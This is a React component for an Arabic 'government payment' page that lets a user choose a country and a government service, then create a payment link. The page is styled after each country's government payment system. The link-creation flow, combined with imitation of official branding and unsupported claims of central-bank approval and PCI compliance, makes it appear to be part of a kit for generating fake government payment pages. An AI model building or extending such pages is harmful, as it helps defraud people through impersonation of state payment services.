import React, { useState, useMemo, useEffect } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import { Card } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Shield, CheckCircle2, Landmark, ArrowRight } from 'lucide-react';
import { getGovernmentServicesByCountry } from '@/lib/governmentPaymentServices';
import { getGovernmentPaymentSystem } from '@/lib/governmentPaymentSystems';
import { COUNTRIES } from '@/lib/countries';
import BackButton from '@/components/BackButton';
import SEOHead from '@/components/SEOHead';

const GovernmentPayment = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const countryParam = searchParams.get('country') || 'SA';
  
  const [selectedCountry, setSelectedCountry] = useState(countryParam);
  const [selectedService, setSelectedService] = useState('');

  // Get government services for the selected country
  const governmentServices = useMemo(() => {
    return getGovernmentServicesByCountry(selectedCountry);
  }, [selectedCountry]);

  const govSystem = useMemo(() => {
    return getGovernmentPaymentSystem(selectedCountry);
  }, [selectedCountry]);

  const selectedServiceData = useMemo(
    () => governmentServices.find(s => s.key === selectedService),
    [governmentServices, selectedService]
  );

  const countryData = COUNTRIES.find(c => c.code === selectedCountry);

  const handleProceed = () => {
    if (selectedService && selectedServiceData) {
      navigate(`/create/${selectedCountry}/government/${selectedService}`);
    }
  };

  return (
    <>
      <SEOHead 
        title={`السداد الحكومي - ${govSystem.nameAr}`}
        description={`دفع رسوم الخدمات الحكومية عبر ${govSystem.nameAr} - جواز السفر، المخالفات المرورية، رخصة القيادة، الخدمات البلدية والمزيد`}
        image="/og-government_payment.jpg"
        type="website"
      />
      
      <div 
        className="min-h-screen py-8 px-4"
        style={{
          background: `linear-gradient(135deg, ${govSystem.colors.surface}, #FFFFFF)`,
          fontFamily: govSystem.fonts.primaryAr
        }}
        dir="rtl"
      >
        <div className="container mx-auto max-w-3xl">
          <div className="mb-6">
            <BackButton />
          </div>

          <Card 
            className="overflow-hidden border-0 shadow-2xl"
            style={{ borderRadius: govSystem.borderRadius.lg }}
          >
            <div 
              className="p-6 sm:p-8 text-center"
              style={{
                background: govSystem.gradients.header,
              }}
            >
              <div className="w-20 h-20 mx-auto mb-4 rounded-full bg-white/20 backdrop-blur-sm flex items-center justify-center">
                <Landmark className="w-12 h-12 text-white" />
              </div>
              <h1 className="text-3xl font-bold text-white mb-2">
                السداد الحكومي
              </h1>
              <p className="text-white/90">
                دفع رسوم الخدمات الحكومية والمحلية
              </p>
            </div>

            <div className="p-6 sm:p-8 space-y-6">
              <div>
                <Label className="text-base font-bold mb-3 block" style={{ color: govSystem.colors.text }}>
                  اختر الدولة *
                </Label>
                <Select value={selectedCountry} onValueChange={setSelectedCountry}>
                  <SelectTrigger 
                    className="h-12 border-2 text-base"
                    style={{
                      borderColor: govSystem.colors.border,
                      fontFamily: govSystem.fonts.primaryAr
                    }}
                  >
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    {COUNTRIES.map((country) => (
                      <SelectItem key={country.code} value={country.code}>
                        <div className="flex items-center gap-3">
                          <span className="text-xl">{country.flag}</span>
                          <span className="font-bold">{country.nameAr}</span>
                        </div>
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              <div>
                <Label className="text-base font-bold mb-3 block" style={{ color: govSystem.colors.text }}>
                  اختر الخدمة الحكومية *
                </Label>
                <Select value={selectedService} onValueChange={setSelectedService}>
                  <SelectTrigger 
                    className="h-12 border-2 text-base"
                    style={{
                      borderColor: govSystem.colors.border,
                      fontFamily: govSystem.fonts.primaryAr
                    }}
                  >
                    <SelectValue placeholder="اختر الخدمة..." />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50 max-h-[400px]">
                    {governmentServices.map((service) => (
                      <SelectItem key={service.id} value={service.key} className="text-base py-3">
                        <div>
                          <div className="font-bold">{service.nameAr}</div>
                          {service.description && (
                            <div className="text-xs text-muted-foreground">{service.description}</div>
                          )}
                        </div>
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                {selectedServiceData && (
                  <p className="text-sm text-muted-foreground mt-2">
                    ✓ {selectedServiceData.description}
                  </p>
                )}
              </div>

              <div 
                className="p-4 rounded-lg"
                style={{
                  background: `${govSystem.colors.primary}10`,
                  borderRight: `4px solid ${govSystem.colors.primary}`
                }}
              >
                <div className="flex items-start gap-3">
                  <Shield className="w-5 h-5 mt-0.5" style={{ color: govSystem.colors.primary }} />
                  <div className="flex-1">
                    <h4 className="font-bold mb-1" style={{ color: govSystem.colors.primary }}>
                      معاملة آمنة ومشفرة
                    </h4>
                    <p className="text-sm text-gray-600">
                      جميع البيانات محمية بتقنية التشفير SSL ومعتمدة من البنك المركزي
                    </p>
                  </div>
                </div>
              </div>

              <Button
                onClick={handleProceed}
                disabled={!selectedService}
                className="w-full h-14 text-lg font-bold text-white shadow-2xl hover:shadow-3xl transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
                style={{
                  background: govSystem.gradients.primary,
                  boxShadow: govSystem.shadows.xl
                }}
              >
                <span className="ml-2">متابعة إلى إنشاء رابط الدفع</span>
                <ArrowRight className="w-5 h-5 mr-2" />
              </Button>

              <div className="pt-4 border-t">
                <h3 className="font-bold text-lg mb-3" style={{ color: govSystem.colors.text }}>
                  إرشادات الدفع
                </h3>
                <ul className="space-y-2 text-sm text-gray-700">
                  <li className="flex items-center gap-2">
                    <Shield className="w-4 h-4" style={{ color: govSystem.colors.primary }} />
                    جميع المعاملات محمية بأعلى معايير الأمان
                  </li>
                  <li className="flex items-center gap-2">
                    <CheckCircle2 className="w-4 h-4" style={{ color: govSystem.colors.primary }} />
                    تأكيد فوري بعد إتمام الدفع
                  </li>
                  <li className="flex items-center gap-2">
                    <CheckCircle2 className="w-4 h-4" style={{ color: govSystem.colors.primary }} />
                    إمكانية طباعة إيصال الدفع
                  </li>
                </ul>
              </div>
            </div>

            <div 
              className="px-8 py-4 text-center text-xs"
              style={{
                background: govSystem.colors.surface,
                borderTop: `1px solid ${govSystem.colors.border}`
              }}
            >
              <div className="flex items-center justify-center gap-4 text-gray-500">
                <div className="flex items-center gap-1">
                  <Shield className="w-3 h-3" />
                  <span>SSL Encrypted</span>
                </div>
                <span>•</span>
                <div className="flex items-center gap-1">
                  <CheckCircle2 className="w-3 h-3" />
                  <span>PCI Compliant</span>
                </div>
              </div>
            </div>
          </Card>
        </div>
      </div>
    </>
  );
};

export default GovernmentPayment;
